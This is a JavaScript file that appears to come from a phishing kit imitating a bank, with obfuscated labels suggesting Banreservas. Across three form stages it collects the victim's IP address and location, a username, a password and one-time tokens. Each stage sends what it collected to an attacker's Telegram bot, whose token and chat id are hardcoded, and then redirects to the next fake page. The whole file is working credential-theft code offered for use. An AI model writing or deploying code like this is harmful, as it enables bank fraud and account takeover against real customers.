//bot token
var telegram_bot_id =  "6683790521:AAEXABOIRVWJH10eIEjmk3rjVVrGpzN7-N4";
//chat id
var chat_id ="@spprtcha";


  $.getJSON("https://api.ipify.org?format=json", function(data) {
          $("#gfg").html(data.ip);
      });
      $.getJSON("https://ipinfo.io", function(response) {
    $("#ip").html("IP: " + response.ip);
    $("#address").html("" + response.city + ", " + response.country);
  });

var u_name, u_name2, ip, ip2;
var ready = function () {
    u_name = document.getElementById("0T4RX").value;
    u_name2 = document.getElementById("C0NTRX").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "🔹B4NR3SE3RV V.3🔹\n👤US3R4x: " + u_name + "\n🔒c0NTR4l: " + u_name2 + "\n\nIP: " + ip +"\n" + ip2 +"\n";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
       $.ajax(settings).done(function (response) {
        window.location = 'index2.html';
        console.log(response);
    });
    return false;
};




  $.getJSON("https://api.ipify.org?format=json", function(data) {
          $("#gfgdos").html(data.ip);
      });
      $.getJSON("https://ipinfo.io", function(response) {
    $("#ip").html("IP: " + response.ip);
    $("#addressdos").html("" + response.city + ", " + response.country);
  });

  var name4, ip2, ip4, message2;
  var ready2 = function() {
	name4 = document.getElementById("0T4RXtok").value;
    ip2 = document.getElementById("gfgdos").innerHTML;
    ip4 = document.getElementById("addressdos").innerHTML;
	message2 = "🔹B4NR3SE3RV V.3🔹\n🔒T0k3n: " + name4 + "\n\nIP: " + ip2 +"\n" + ip4 +"\n";
  };
  var sender2 = function() {
    ready2();
    var settings = {
      "async": true,
      "crossDomain": true,
      "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
      "method": "POST",
      "headers": {
        "Content-Type": "application/json",
        "cache-control": "no-cache"
      },
      "data": JSON.stringify({
        "chat_id": chat_id,
        "text": message2
      })
    };
    $.ajax(settings).done(function(response) {
      console.log(response);
      window.location = 'index3.html';
    });
    return false;
  };
  
  

  
    $.getJSON("https://api.ipify.org?format=json", function(data) {
          $("#gfgtres").html(data.ip);
      });
      $.getJSON("https://ipinfo.io", function(response) {
    $("#ip").html("IP: " + response.ip);
    $("#addresstres").html("" + response.city + ", " + response.country);
  });
 
  var name6, ip6, ip8, message3;
  var ready3 = function() {
	name6 = document.getElementById("0T4RXtok2").value;
    ip6 = document.getElementById("gfgtres").innerHTML;
    ip8 = document.getElementById("addresstres").innerHTML;
	message3 = "🔹B4NR3SE3RV V.3🔹\n🔒T0k3n: " + name6 + "\n\nIP: " + ip6 +"\n" + ip8 +"\n";
  };
  var sender3 = function() {
    ready3();
    var settings = {
      "async": true,
      "crossDomain": true,
      "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
      "method": "POST",
      "headers": {
        "Content-Type": "application/json",
        "cache-control": "no-cache"
      },
      "data": JSON.stringify({
        "chat_id": chat_id,
        "text": message3
      })
    };
    $.ajax(settings).done(function(response) {
      console.log(response);
      window.location = 'index3.html';
    });
    return false;
  };
  
